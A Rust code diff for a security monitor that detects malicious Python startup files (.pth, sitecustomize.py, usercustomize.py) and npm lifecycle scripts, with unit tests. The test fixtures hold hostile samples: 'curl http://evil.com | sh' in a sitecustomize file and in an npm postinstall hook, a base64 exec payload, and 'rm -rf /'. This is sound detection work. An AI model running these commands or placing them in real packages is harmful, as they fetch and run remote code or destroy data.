@@ -8,6 +8,7 @@ use std::path::Path;
 
 use sanctum_sentinel::pth::analyser::{
     analyse_pth_file_with_custom_allowlist, content_hash, FileAnalysis, FileVerdict,
+    CRITICAL_KEYWORDS,
 };
 use sanctum_sentinel::pth::lineage::{LineageAssessment, ProcessLineage, SystemProcSource};
 use sanctum_sentinel::pth::quarantine::{Quarantine, QuarantineMetadata};
@@ -17,9 +18,9 @@ use sanctum_types::config::SanctumConfig;
 use crate::audit;
 use crate::context::VerdictContext;
 
-// ── Filesystem (.pth) event handling ────────────────────────────────────────
+// ── Filesystem (.pth / sitecustomize) event handling ─────────────────────────
 
-/// Maximum size for a .pth file to be read for analysis (1 MB).
+/// Maximum size for a watched file to be read for analysis (1 MB).
 const MAX_PTH_READ_SIZE: u64 = 1_048_576;
 
 /// Read a file with a bounded size limit, avoiding TOCTOU races.
@@ -38,10 +39,26 @@ fn bounded_read_file(path: &Path, max_size: u64) -> Result<Option<String>, std::
     Ok(Some(String::from_utf8_lossy(&buf).into_owned()))
 }
 
-/// Handle a filesystem watch event for a `.pth` file.
+/// Check whether a path refers to a `sitecustomize.py` or `usercustomize.py` file.
+fn is_site_customize_file(path: &Path) -> bool {
+    let file_name = path
+        .file_name()
+        .and_then(|n| n.to_str())
+        .unwrap_or("");
+    file_name.eq_ignore_ascii_case("sitecustomize.py")
+        || file_name.eq_ignore_ascii_case("usercustomize.py")
+}
+
+/// Handle a filesystem watch event for a `.pth`, `sitecustomize.py`, or
+/// `usercustomize.py` file.
 ///
-/// Reads the file, analyses its content, traces process lineage, and dispatches
-/// to the appropriate verdict handler based on the analysis result.
+/// For `.pth` files: reads the file, analyses its content via the PTH analyser
+/// pipeline, traces process lineage, and dispatches to the appropriate verdict
+/// handler based on the analysis result.
+///
+/// For `sitecustomize.py` / `usercustomize.py`: performs a bounded read and
+/// scans for critical keywords. If suspicious keywords are found, emits a
+/// `ThreatEvent` with `ThreatCategory::SiteCustomize`.
 pub fn handle_watch_event(
     event: &WatchEvent,
     quarantine: &Quarantine,
@@ -50,79 +67,173 @@ pub fn handle_watch_event(
 ) {
     match event.kind {
         WatchEventKind::Created | WatchEventKind::Modified => {
-            tracing::info!(path = %event.path.display(), "detected .pth file change");
-
-            // Perform a single bounded read to avoid TOCTOU: instead of checking
-            // metadata then reading, we open the file and use `Read::take()` to
-            // limit the number of bytes consumed in one atomic operation.
-            let content = match bounded_read_file(&event.path, MAX_PTH_READ_SIZE) {
-                Ok(Some(c)) => c,
-                Ok(None) => {
-                    tracing::warn!(
-                        path = %event.path.display(),
-                        "file too large to analyse (max {MAX_PTH_READ_SIZE} bytes)"
-                    );
-                    return;
-                }
-                Err(e) => {
-                    tracing::warn!(path = %event.path.display(), %e, "failed to read file");
-                    return;
-                }
-            };
-
-            // Extract package name from the .pth file stem (e.g. "setuptools.pth" -> "setuptools")
-            let package_name = event
-                .path
-                .file_stem()
-                .and_then(|s| s.to_str())
-                .unwrap_or("unknown");
-
-            let hash = content_hash(content.as_bytes());
-            // Merge user-configured pth_allowlist with the built-in defaults
-            let custom_allowlist = if config.sentinel.pth_allowlist.is_empty() {
-                None
+            if is_site_customize_file(&event.path) {
+                handle_site_customize_event(event, audit_path);
             } else {
-                Some(config.sentinel.pth_allowlist.as_slice())
-            };
-            let analysis = analyse_pth_file_with_custom_allowlist(
-                &content,
-                package_name,
-                &hash,
-                custom_allowlist,
-            );
-
-            // Attempt to determine the creator process (best-effort)
-            let (creator_pid, creator_exe, lineage_assessment) = try_find_creator_pid(&event.path)
-                .map_or(
-                    (None, None, LineageAssessment::Undetermined),
-                    trace_creator_lineage,
-                );
-
-            // Determine the effective threat level, escalating if lineage is suspicious
-            let escalate_for_lineage =
-                lineage_assessment == LineageAssessment::SuspiciousPythonStartup;
-
-            let ctx = VerdictContext {
-                event,
-                creator_pid,
-                creator_exe,
-                audit_path,
-            };
-
-            match analysis.verdict {
-                FileVerdict::Safe | FileVerdict::AllowlistedKnownPackage => {
-                    handle_safe_verdict(&ctx, escalate_for_lineage);
-                }
-                FileVerdict::Warning => {
-                    handle_warning_verdict(&ctx, &analysis, escalate_for_lineage);
-                }
-                FileVerdict::Critical => {
-                    handle_critical_verdict(&ctx, &analysis, &hash, config, quarantine);
-                }
+                handle_pth_event(event, quarantine, config, audit_path);
             }
         }
         WatchEventKind::Deleted => {
             tracing::info!(path = %event.path.display(), "watched file deleted");
+        }
+    }
+}
+
+/// Handle a `sitecustomize.py` or `usercustomize.py` watch event.
+///
+/// Performs a bounded read of the file, scans for critical keywords, and emits
+/// a `ThreatEvent` if suspicious patterns are found.
+fn handle_site_customize_event(event: &WatchEvent, audit_path: &Path) {
+    tracing::info!(path = %event.path.display(), "detected sitecustomize/usercustomize change");
+
+    let content = match bounded_read_file(&event.path, MAX_PTH_READ_SIZE) {
+        Ok(Some(c)) => c,
+        Ok(None) => {
+            tracing::warn!(
+                path = %event.path.display(),
+                "sitecustomize file too large to analyse (max {MAX_PTH_READ_SIZE} bytes)"
+            );
+            return;
+        }
+        Err(e) => {
+            tracing::warn!(path = %event.path.display(), %e, "failed to read sitecustomize file");
+            return;
+        }
+    };
+
+    // Scan for critical keywords
+    let lower_content = content.to_lowercase();
+    let found_keywords: Vec<&str> = CRITICAL_KEYWORDS
+        .iter()
+        .filter(|kw| lower_content.contains(&kw.to_lowercase()))
+        .copied()
+        .collect();
+
+    // Best-effort process lineage
+    let (creator_pid, creator_exe) = try_find_creator_pid(&event.path).map_or(
+        (None, None),
+        |pid| {
+            match ProcessLineage::trace(pid, &SystemProcSource) {
+                Ok(lineage) => {
+                    let exe = lineage.root_ancestor().and_then(|p| p.exe.clone());
+                    tracing::info!(pid, "sitecustomize creator process lineage traced");
+                    (Some(pid), exe)
+                }
+                Err(e) => {
+                    tracing::debug!(pid, %e, "failed to trace sitecustomize creator lineage");
+                    (Some(pid), None)
+                }
+            }
+        },
+    );
+
+    if found_keywords.is_empty() {
+        tracing::info!(
+            path = %event.path.display(),
+            "sitecustomize file appears benign"
+        );
+        return;
+    }
+
+    tracing::warn!(
+        path = %event.path.display(),
+        keywords = ?found_keywords,
+        "suspicious keywords found in sitecustomize file"
+    );
+
+    let threat_event = sanctum_types::threat::ThreatEvent {
+        timestamp: chrono::Utc::now(),
+        level: sanctum_types::threat::ThreatLevel::Warning,
+        category: sanctum_types::threat::ThreatCategory::SiteCustomize,
+        description: format!(
+            "Suspicious keywords in {}: {}",
+            event.path.display(),
+            found_keywords.join(", "),
+        ),
+        source_path: event.path.clone(),
+        creator_pid,
+        creator_exe,
+        action_taken: sanctum_types::threat::Action::Alerted,
+    };
+    sanctum_notify::notify_threat(&threat_event);
+    audit::append_audit_event(&threat_event, audit_path);
+}
+
+/// Handle a `.pth` file watch event through the full PTH analyser pipeline.
+fn handle_pth_event(
+    event: &WatchEvent,
+    quarantine: &Quarantine,
+    config: &SanctumConfig,
+    audit_path: &Path,
+) {
+    tracing::info!(path = %event.path.display(), "detected .pth file change");
+
+    // Perform a single bounded read to avoid TOCTOU: instead of checking
+    // metadata then reading, we open the file and use `Read::take()` to
+    // limit the number of bytes consumed in one atomic operation.
+    let content = match bounded_read_file(&event.path, MAX_PTH_READ_SIZE) {
+        Ok(Some(c)) => c,
+        Ok(None) => {
+            tracing::warn!(
+                path = %event.path.display(),
+                "file too large to analyse (max {MAX_PTH_READ_SIZE} bytes)"
+            );
+            return;
+        }
+        Err(e) => {
+            tracing::warn!(path = %event.path.display(), %e, "failed to read file");
+            return;
+        }
+    };
+
+    // Extract package name from the .pth file stem (e.g. "setuptools.pth" -> "setuptools")
+    let package_name = event
+        .path
+        .file_stem()
+        .and_then(|s| s.to_str())
+        .unwrap_or("unknown");
+
+    let hash = content_hash(content.as_bytes());
+    // Merge user-configured pth_allowlist with the built-in defaults
+    let custom_allowlist = if config.sentinel.pth_allowlist.is_empty() {
+        None
+    } else {
+        Some(config.sentinel.pth_allowlist.as_slice())
+    };
+    let analysis = analyse_pth_file_with_custom_allowlist(
+        &content,
+        package_name,
+        &hash,
+        custom_allowlist,
+    );
+
+    // Attempt to determine the creator process (best-effort)
+    let (creator_pid, creator_exe, lineage_assessment) = try_find_creator_pid(&event.path)
+        .map_or(
+            (None, None, LineageAssessment::Undetermined),
+            trace_creator_lineage,
+        );
+
+    // Determine the effective threat level, escalating if lineage is suspicious
+    let escalate_for_lineage =
+        lineage_assessment == LineageAssessment::SuspiciousPythonStartup;
+
+    let ctx = VerdictContext {
+        event,
+        creator_pid,
+        creator_exe,
+        audit_path,
+    };
+
+    match analysis.verdict {
+        FileVerdict::Safe | FileVerdict::AllowlistedKnownPackage => {
+            handle_safe_verdict(&ctx, escalate_for_lineage);
+        }
+        FileVerdict::Warning => {
+            handle_warning_verdict(&ctx, &analysis, escalate_for_lineage);
+        }
+        FileVerdict::Critical => {
+            handle_critical_verdict(&ctx, &analysis, &hash, config, quarantine);
         }
     }
 }
@@ -298,6 +409,96 @@ pub fn handle_npm_event(event: &crate::NpmLifecycleEvent, audit_path: &Path) {
     };
     sanctum_notify::notify_threat(&threat_event);
     crate::audit::append_audit_event(&threat_event, audit_path);
+}
+
+/// Handle a batch of npm package scan results from the `NpmWatcher`.
+///
+/// Scans each package directory using `scan_package()` and emits threat events
+/// for critical findings. Non-critical findings are logged at info level.
+pub fn handle_npm_scan_results(
+    package_dirs: &[std::path::PathBuf],
+    audit_path: &Path,
+) {
+    for package_dir in package_dirs {
+        let result = sanctum_sentinel::npm::scanner::scan_package(package_dir);
+
+        for warning in &result.warnings {
+            tracing::info!(
+                package = %package_dir.display(),
+                warning = %warning,
+                "npm scan warning"
+            );
+        }
+
+        match result.risk {
+            sanctum_sentinel::npm::scanner::RiskLevel::Critical => {
+                let description = if result.findings.is_empty() {
+                    format!(
+                        "Critical npm lifecycle threat in {}",
+                        package_dir.display(),
+                    )
+                } else {
+                    let finding_descs: Vec<&str> =
+                        result.findings.iter().map(|f| f.pattern.as_str()).collect();
+                    format!(
+                        "Critical npm lifecycle threat in {}: {}",
+                        package_dir.display(),
+                        finding_descs.join("; "),
+                    )
+                };
+
+                tracing::error!(
+                    package = %package_dir.display(),
+                    findings = result.findings.len(),
+                    "CRITICAL: malicious npm package detected"
+                );
+
+                let threat_event = sanctum_types::threat::ThreatEvent {
+                    timestamp: chrono::Utc::now(),
+                    level: sanctum_types::threat::ThreatLevel::Critical,
+                    category: sanctum_types::threat::ThreatCategory::NpmLifecycleAttack,
+                    description,
+                    source_path: package_dir.clone(),
+                    creator_pid: None,
+                    creator_exe: None,
+                    action_taken: sanctum_types::threat::Action::Alerted,
+                };
+                sanctum_notify::notify_threat(&threat_event);
+                crate::audit::append_audit_event(&threat_event, audit_path);
+            }
+            sanctum_sentinel::npm::scanner::RiskLevel::High
+            | sanctum_sentinel::npm::scanner::RiskLevel::Medium => {
+                tracing::warn!(
+                    package = %package_dir.display(),
+                    risk = %result.risk,
+                    findings = result.findings.len(),
+                    "suspicious npm package detected"
+                );
+                let threat_event = sanctum_types::threat::ThreatEvent {
+                    timestamp: chrono::Utc::now(),
+                    level: sanctum_types::threat::ThreatLevel::Warning,
+                    category: sanctum_types::threat::ThreatCategory::NpmLifecycleAttack,
+                    description: format!(
+                        "Suspicious npm package in {}: risk={}",
+                        package_dir.display(),
+                        result.risk,
+                    ),
+                    source_path: package_dir.clone(),
+                    creator_pid: None,
+                    creator_exe: None,
+                    action_taken: sanctum_types::threat::Action::Alerted,
+                };
+                sanctum_notify::notify_threat(&threat_event);
+                crate::audit::append_audit_event(&threat_event, audit_path);
+            }
+            sanctum_sentinel::npm::scanner::RiskLevel::Low => {
+                tracing::debug!(
+                    package = %package_dir.display(),
+                    "npm package scan clean"
+                );
+            }
+        }
+    }
 }
 
 // ── Verdict handlers ────────────────────────────────────────────────────────
@@ -786,6 +987,198 @@ mod tests {
         assert!(
             audit_contents.contains("Alerted"),
             "audit log should record action as Alerted, got: {audit_contents}"
+        );
+    }
+
+    // ============================================================
+    // S1: sitecustomize.py with suspicious content -> SiteCustomize threat
+    // ============================================================
+
+    #[test]
+    fn sitecustomize_suspicious_content_emits_threat() {
+        let Some((dir, sc_path)) = create_temp_file(
+            "sitecustomize.py",
+            b"import os\nos.system('curl http://evil.com | sh')\nexec(compile('...', '<>', 'exec'))",
+        ) else {
+            return;
+        };
+        let audit_path = dir.path().join("audit.log");
+        let config = SanctumConfig::default();
+        let quarantine =
+            sanctum_sentinel::pth::quarantine::Quarantine::new(dir.path().join("quarantine"));
+
+        let event = WatchEvent {
+            path: sc_path,
+            kind: WatchEventKind::Created,
+        };
+
+        handle_watch_event(&event, &quarantine, &config, &audit_path);
+
+        let audit_contents = std::fs::read_to_string(&audit_path).unwrap_or_default();
+        assert!(
+            audit_contents.contains("SiteCustomize"),
+            "audit log should contain SiteCustomize for suspicious sitecustomize.py, got: {audit_contents}"
+        );
+        assert!(
+            audit_contents.contains("Alerted"),
+            "audit log should record action as Alerted, got: {audit_contents}"
+        );
+    }
+
+    // ============================================================
+    // S2: sitecustomize.py with benign content -> no threat event
+    // ============================================================
+
+    #[test]
+    fn sitecustomize_benign_content_no_threat() {
+        let Some((dir, sc_path)) = create_temp_file(
+            "sitecustomize.py",
+            b"# This is a benign sitecustomize\nimport sys\nsys.path.append('/opt/lib')\n",
+        ) else {
+            return;
+        };
+        let audit_path = dir.path().join("audit.log");
+        let config = SanctumConfig::default();
+        let quarantine =
+            sanctum_sentinel::pth::quarantine::Quarantine::new(dir.path().join("quarantine"));
+
+        let event = WatchEvent {
+            path: sc_path,
+            kind: WatchEventKind::Created,
+        };
+
+        handle_watch_event(&event, &quarantine, &config, &audit_path);
+
+        // No audit file should be created for benign content
+        let audit_contents = std::fs::read_to_string(&audit_path).unwrap_or_default();
+        assert!(
+            !audit_contents.contains("SiteCustomize"),
+            "audit log should not contain SiteCustomize for benign content, got: {audit_contents}"
+        );
+    }
+
+    // ============================================================
+    // S3: usercustomize.py handled same as sitecustomize.py
+    // ============================================================
+
+    #[test]
+    fn usercustomize_suspicious_content_emits_threat() {
+        let Some((dir, uc_path)) = create_temp_file(
+            "usercustomize.py",
+            b"import subprocess\nsubprocess.call(['rm', '-rf', '/'])",
+        ) else {
+            return;
+        };
+        let audit_path = dir.path().join("audit.log");
+        let config = SanctumConfig::default();
+        let quarantine =
+            sanctum_sentinel::pth::quarantine::Quarantine::new(dir.path().join("quarantine"));
+
+        let event = WatchEvent {
+            path: uc_path,
+            kind: WatchEventKind::Created,
+        };
+
+        handle_watch_event(&event, &quarantine, &config, &audit_path);
+
+        let audit_contents = std::fs::read_to_string(&audit_path).unwrap_or_default();
+        assert!(
+            audit_contents.contains("SiteCustomize"),
+            "audit log should contain SiteCustomize for suspicious usercustomize.py, got: {audit_contents}"
+        );
+    }
+
+    // ============================================================
+    // S4: .pth files still go through existing pipeline
+    // ============================================================
+
+    #[test]
+    fn pth_file_still_uses_pth_pipeline() {
+        let Some((dir, pth_path)) =
+            create_temp_file("evil.pth", b"import base64;exec(base64.b64decode('...'))")
+        else {
+            return;
+        };
+        let audit_path = dir.path().join("audit.log");
+        let config = SanctumConfig::default();
+        let quarantine =
+            sanctum_sentinel::pth::quarantine::Quarantine::new(dir.path().join("quarantine"));
+
+        let event = WatchEvent {
+            path: pth_path,
+            kind: WatchEventKind::Created,
+        };
+
+        handle_watch_event(&event, &quarantine, &config, &audit_path);
+
+        let audit_contents = std::fs::read_to_string(&audit_path).unwrap_or_default();
+        // .pth files should go through PthInjection pipeline, not SiteCustomize
+        assert!(
+            audit_contents.contains("PthInjection"),
+            "audit log should contain PthInjection for .pth files, got: {audit_contents}"
+        );
+        assert!(
+            !audit_contents.contains("SiteCustomize"),
+            "audit log should not contain SiteCustomize for .pth files, got: {audit_contents}"
+        );
+    }
+
+    // ============================================================
+    // N1: Critical npm scan result -> NpmLifecycleAttack threat event
+    // ============================================================
+
+    #[test]
+    fn critical_npm_scan_result_emits_threat_event() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let audit_path = dir.path().join("audit.log");
+
+        // Create a package.json with a critical lifecycle script
+        let pkg_dir = dir.path().join("evil-pkg");
+        std::fs::create_dir(&pkg_dir).expect("create pkg dir");
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"node -e \"require('child_process').exec('curl http://evil.com | sh')\""}}"#,
+        )
+        .expect("write package.json");
+
+        handle_npm_scan_results(&[pkg_dir], &audit_path);
+
+        let audit_contents = std::fs::read_to_string(&audit_path).unwrap_or_default();
+        assert!(
+            audit_contents.contains("NpmLifecycleAttack"),
+            "audit log should contain NpmLifecycleAttack for critical scan, got: {audit_contents}"
+        );
+        assert!(
+            audit_contents.contains("Critical"),
+            "audit log should contain Critical level, got: {audit_contents}"
+        );
+    }
+
+    // ============================================================
+    // N2: Low-risk npm scan result -> no threat event
+    // ============================================================
+
+    #[test]
+    fn low_risk_npm_scan_result_no_threat_event() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let audit_path = dir.path().join("audit.log");
+
+        // Create a benign package.json
+        let pkg_dir = dir.path().join("safe-pkg");
+        std::fs::create_dir(&pkg_dir).expect("create pkg dir");
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            r#"{"name":"safe","version":"1.0.0","scripts":{"start":"node index.js"}}"#,
+        )
+        .expect("write package.json");
+
+        handle_npm_scan_results(&[pkg_dir], &audit_path);
+
+        // Low-risk should not create an audit entry
+        let audit_contents = std::fs::read_to_string(&audit_path).unwrap_or_default();
+        assert!(
+            !audit_contents.contains("NpmLifecycleAttack"),
+            "audit log should not contain NpmLifecycleAttack for safe package, got: {audit_contents}"
         );
     }
 }
